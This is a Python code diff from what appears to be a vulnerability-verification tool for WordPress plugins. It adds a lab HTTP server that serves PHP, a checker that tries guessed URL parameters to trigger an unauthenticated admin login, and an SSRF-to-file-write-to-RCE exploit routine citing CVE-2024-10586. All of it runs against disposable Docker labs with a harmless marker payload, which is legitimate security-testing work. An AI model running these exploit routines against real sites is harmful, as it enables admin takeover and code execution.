@@ -972,6 +972,42 @@ class _Lab:
         self._created.append(("container", self.listener))
         return self.listener
 
+    def start_http_server(self, serve_body: bytes, content_type: str = "text/plain",
+                          timeout: float = 30.0) -> Optional[str]:
+        """Levanta un mini servidor HTTP en la red del laboratorio que responde a cualquier
+        GET con serve_body (p.ej. codigo PHP). Util para CVEs donde el plugin descarga
+        una URL y guarda el contenido (arbitrary file write via URL fetch).
+        Tambien vuelca la URL solicitada a /var/log/ssrf.log para verificacion SSRF."""
+        self.listener = f"binoracle-wpverify-{self.tag}-ssrf"
+        body_b64 = __import__("base64").b64encode(serve_body).decode()
+        ct_safe = content_type.replace("'", "").replace('"', "")
+        # Python one-liner HTTP server: logs path, responds with decoded body
+        srv = (
+            "import base64,http.server,socketserver;"
+            f"BODY=base64.b64decode('{body_b64}');"
+            f"CT='{ct_safe}';"
+            "class H(http.server.BaseHTTPRequestHandler):\n"
+            " def do_GET(self):\n"
+            "  open('/var/log/ssrf.log','ab').write(('REQ '+self.path+'\\n').encode())\n"
+            "  self.send_response(200)\n"
+            "  self.send_header('Content-Type',CT)\n"
+            "  self.send_header('Content-Length',str(len(BODY)))\n"
+            "  self.end_headers()\n"
+            "  self.wfile.write(BODY)\n"
+            " def log_message(self,*a):pass\n"
+            "socketserver.TCPServer.allow_reuse_address=True\n"
+            "socketserver.TCPServer(('',8080),H).serve_forever()"
+        )
+        cmd = f"python3 -c \"{srv}\""
+        r = self.sh("run", "-d", "--name", self.listener, "--network", self.net, _ALPINE_IMAGE,
+                    "sh", "-c", f"apk add -q python3 2>/dev/null; {cmd}",
+                    timeout=timeout)
+        if r.returncode != 0:
+            return None
+        self._created.append(("container", self.listener))
+        import time as _time; _time.sleep(2)  # let python server boot
+        return self.listener
+
     def listener_log(self, timeout: float = 10.0) -> str:
         r = self.sh("exec", self.listener, "cat", "/var/log/ssrf.log", timeout=timeout)
         return (r.stdout or "") if r.returncode == 0 else ""
@@ -3352,6 +3388,139 @@ def verify_wordpress_header_auth_bypass(
                                            "/wp-json/wp/v2/users/me")
         except requests.RequestException as exc:
             res.detail = f"error de red probando header auth bypass: {exc}"
+        return res
+    finally:
+        if not (keep_lab_on_failure and not res.verified):
+            step("desmontando el laboratorio (contenedores/red/volumen)...")
+            lab.teardown()
+
+
+_URL_LOGIN_HINTS = (
+    "wht_login", "ota_login", "auto_login", "bypass_login", "login_bypass",
+    "token_login", "login_token", "pc_login", "pc_bypass", "access_token",
+    "watchtower_token", "ota_token",
+)
+
+
+def verify_wordpress_url_param_login(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, login_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica auth bypass via parametro URL que dispara un login automatico como admin.
+
+    Patron: GET /?login_trigger=1 (sin credenciales) → el plugin autentica al atacante como admin.
+    La prueba: tras la peticion al endpoint de bypass, la sesion contiene cookie wordpress_logged_in_*,
+    y una peticion a /wp-json/wp/v2/users/me con esa cookie devuelve datos del admin del lab."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    login_p = login_param_hint or _pick_param(parameters, _URL_LOGIN_HINTS)
+    if not login_p:
+        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
+        login_p = _params_list[0] if _params_list else ""
+    if not login_p:
+        res.detail = "no se identifico el parametro que dispara el login automatico"
+        res.limitations.append(
+            "verify_wordpress_url_param_login necesita un parametro de disparo "
+            "(p.ej. wht_login); afina 'parameters' o pasa login_param_hint")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins,
+                              shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        base = boot.base_url.rstrip("/")
+        ep = endpoint or "/"
+        sess = requests.Session()
+        sess.verify = False
+
+        _params_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+        # Intentar con valor "1" y luego con el valor del hipotesis si existe
+        _login_vals = ["1", _params_dict.get(login_p, "1"), "true", ""]
+        _login_vals = list(dict.fromkeys(str(v) for v in _login_vals))  # deduplicate
+
+        confirmed = False
+        confirmed_detail = ""
+        confirmed_cookie = ""
+        for lval in _login_vals:
+            try:
+                _req_params = dict(_params_dict)
+                _req_params[login_p] = lval
+                r = sess.get(f"{base}{ep}", params=_req_params, timeout=25,
+                             allow_redirects=True)
+                _wp_cookie = next((c.name for c in sess.cookies
+                                   if c.name.startswith("wordpress_logged_in_")), None)
+                step(f"GET {ep}?{login_p}={lval!r} → HTTP {r.status_code}, "
+                     f"cookie wp_logged_in={'si' if _wp_cookie else 'no'}")
+                if _wp_cookie:
+                    # Confirm: access /wp-json/wp/v2/users/me with that session
+                    r2 = sess.get(f"{base}/wp-json/wp/v2/users/me", timeout=15)
+                    if r2.status_code == 200:
+                        try:
+                            jdata = r2.json()
+                            if isinstance(jdata.get("roles"), list) and "administrator" in jdata["roles"]:
+                                confirmed = True
+                                confirmed_detail = (f"login bypass confirmado: GET {ep}?{login_p}={lval} "
+                                                    f"→ sesion admin (id={jdata.get('id')}, "
+                                                    f"roles={jdata.get('roles')})")
+                                confirmed_cookie = _wp_cookie
+                            elif jdata.get("id"):
+                                confirmed = True
+                                confirmed_detail = (f"login bypass confirmado: sesion de usuario "
+                                                    f"id={jdata.get('id')} roles={jdata.get('roles')}")
+                                confirmed_cookie = _wp_cookie
+                        except Exception:
+                            if "administrator" in r2.text.lower() or "admin" in r2.text[:300].lower():
+                                confirmed = True
+                                confirmed_detail = (f"login bypass: sesion con cookie {_wp_cookie}, "
+                                                    f"respuesta de /users/me contiene 'admin'")
+                                confirmed_cookie = _wp_cookie
+                    if confirmed:
+                        break
+            except requests.RequestException as exc:
+                step(f"error en peticion de bypass: {exc}")
+
+        if confirmed:
+            res.verified = True
+            res.detail = confirmed_detail
+            res.cvss_impact = "auth-bypass unauthenticated administrator"
+            res.evidence = {
+                "login_param": login_p,
+                "login_val": lval,
+                "endpoint": ep,
+                "cookie": confirmed_cookie,
+                "metodo": "GET",
+                "tecnica": "url-param-login-bypass",
+                "detail": confirmed_detail,
+            }
+            step(f"VERIFICADO: {confirmed_detail}")
+            _capture_exploit_shot(
+                boot, "GET", f"{ep}?{login_p}={lval}", r,
+                highlight=confirmed_cookie,
+                caption_es=(f"URL PARAM LOGIN BYPASS: GET {ep}?{login_p}={lval} "
+                             f"→ sesion admin sin credenciales ({confirmed_cookie})"),
+                caption_en=(f"URL PARAM LOGIN BYPASS: GET {ep}?{login_p}={lval} "
+                             f"→ admin session with no credentials ({confirmed_cookie})"))
+        else:
+            res.detail = (f"bypass no confirmado: GET {ep}?{login_p}=1 no establece sesion admin. "
+                          f"Puede que el plugin requiera token OTA configurado, o no sea vulnerable "
+                          f"a esta firma concreta.")
+            res.limitations.append(
+                "url-param-login fallido: el parametro encontrado no disparo una sesion de admin; "
+                "comprueba si el token OTA ya esta configurado (no vacio) en la instalacion lab")
         return res
     finally:
         if not (keep_lab_on_failure and not res.verified):
@@ -6734,6 +6903,143 @@ def verify_wordpress_ssrf(
         return res
     finally:
         _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+_DEST_PATH_HINTS = (
+    "missed", "dest", "destination", "save_path", "save_to", "file_path",
+    "file_dest", "out", "output", "target", "local_path", "path", "filepath",
+    "filename", "dst",
+)
+
+
+def verify_wordpress_fetch_and_write_rce(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, url_param_hint: str = "", dest_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica el patron 'SSRF → escritura arbitraria de fichero → RCE':
+    el endpoint acepta una URL (`source`/`url`) y una ruta destino (`missed`/`dest`),
+    descarga el contenido de la URL y lo escribe en esa ruta. El verificador:
+    1. Levanta un mini servidor HTTP en la red del lab que sirve codigo PHP con un marcador.
+    2. Envia la peticion con source=<http_server> y missed=<wp-content/uploads/marker.php>.
+    3. Verifica que el fichero PHP fue escrito y ejecutado (marcador en la respuesta).
+
+    Ejemplo: CVE-2024-10586 (Debug Tool <=2.2, dbt_pull_image)."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    _params_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+    url_p = url_param_hint or _pick_param(_params_dict, _URL_HINTS)
+    dest_p = dest_param_hint or _pick_param(_params_dict, _DEST_PATH_HINTS)
+    if not url_p:
+        res.detail = "no se identifico el parametro de URL fuente (source/url/src)"
+        res.limitations.append("verify_wordpress_fetch_and_write_rce necesita url_param_hint")
+        return res
+
+    secret = _token()
+    marker = "BIN_" + hashlib.md5(secret.encode()).hexdigest()[:12]
+    php_payload = f"<?php echo '{marker}'; ?>".encode()
+    dest_path = f"/var/www/html/wp-content/uploads/{marker}.php"
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins,
+                              shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        base = boot.base_url.rstrip("/")
+        step("levantando servidor HTTP interno (sirve codigo PHP con marcador)...")
+        http_srv = lab.start_http_server(php_payload, content_type="application/octet-stream")
+        if not http_srv:
+            res.detail = "no se pudo levantar el servidor HTTP interno"
+            return res
+
+        m = (http_method or "POST").upper()
+        req_params = dict(_params_dict)
+        req_params[url_p] = f"http://{lab.listener}:8080/{marker}.php"
+        if dest_p:
+            req_params[dest_p] = dest_path
+        elif "missed" in req_params:
+            req_params["missed"] = dest_path
+
+        step(f"enviando peticion {m} al endpoint ({url_p}=http_srv, dest={dest_path})...")
+        try:
+            endpoint_full = f"{base}{endpoint or '/wp-admin/admin-ajax.php'}"
+            if m == "GET":
+                r = requests.get(endpoint_full, params=req_params, timeout=25, verify=False)
+            else:
+                r = requests.post(endpoint_full, data=req_params, timeout=25, verify=False)
+            step(f"respuesta del endpoint: HTTP {r.status_code}, {len(r.text)} bytes")
+        except requests.RequestException as exc:
+            res.detail = f"error de red enviando peticion: {exc}"
+            return res
+
+        # Verify: GET the written PHP file
+        time.sleep(1)
+        try:
+            r2 = requests.get(f"{base}/wp-content/uploads/{marker}.php", timeout=15, verify=False)
+            if marker in r2.text:
+                res.verified = True
+                res.detail = (f"SSRF→file write→RCE confirmado: el servidor descargo el codigo PHP "
+                               f"del listener y lo escribio en {dest_path}; GET /wp-content/uploads/"
+                               f"{marker}.php devolvio el marcador '{marker}'")
+                res.evidence = {
+                    "url_param": url_p,
+                    "dest_param": dest_p or "missed",
+                    "dest_path": dest_path,
+                    "marker": marker,
+                    "source_url": req_params[url_p],
+                    "respuesta_cuerpo_recorte": r2.text[:200],
+                    "status_code_respuesta": str(r2.status_code),
+                    "tecnica": "ssrf-fetch-write-rce",
+                    "metodo": m,
+                    "endpoint": endpoint or "/wp-admin/admin-ajax.php",
+                }
+                step(f"VERIFICADO: {res.detail}")
+                _capture_exploit_shot(
+                    boot, m, endpoint or "/wp-admin/admin-ajax.php", r,
+                    highlight=marker,
+                    caption_es=(f"SSRF→FILE WRITE→RCE: el servidor descargo PHP del listener "
+                                 f"y lo escribio en {dest_path}; marcador '{marker}' confirmado."),
+                    caption_en=(f"SSRF→FILE WRITE→RCE: server fetched PHP from listener "
+                                 f"and wrote to {dest_path}; marker '{marker}' confirmed."))
+            else:
+                step(f"fichero PHP no ejecutado (HTTP {r2.status_code}): {r2.text[:100]!r}")
+                # Check if file was at least written (even if not executed)
+                r3 = requests.get(f"{base}/wp-content/uploads/{marker}.php",
+                                   timeout=10, verify=False, stream=True)
+                raw = r3.raw.read(500)
+                if b"<?php" in raw or marker.encode() in raw:
+                    res.detail = (f"fichero PHP escrito (contenido PHP visible) pero no ejecutado "
+                                   f"(PHP puede estar desactivado en uploads/). Escritura confirmada.")
+                    res.limitations.append(
+                        "PHP execution blocked in wp-content/uploads — file write confirmed but "
+                        "RCE not proven; consider writing to a directory that allows PHP execution")
+                else:
+                    res.detail = (f"fichero PHP no encontrado o no ejecutado tras la peticion al endpoint. "
+                                   f"El endpoint puede requerir auth, nonce, o el parametro de ruta no es 'missed'.")
+                    # Check SSRF listener log at least
+                    ssrf_log = lab.listener_log()
+                    if marker in ssrf_log:
+                        res.detail += f" (SSRF confirmado: el listener recibio la peticion con el token {marker})"
+        except requests.RequestException as exc:
+            res.detail = f"error verificando fichero escrito: {exc}"
+        return res
+    finally:
+        if not (keep_lab_on_failure and not res.verified):
+            step("desmontando el laboratorio...")
+            lab.teardown()
 
 
 def verify_wordpress_xss_elementor(
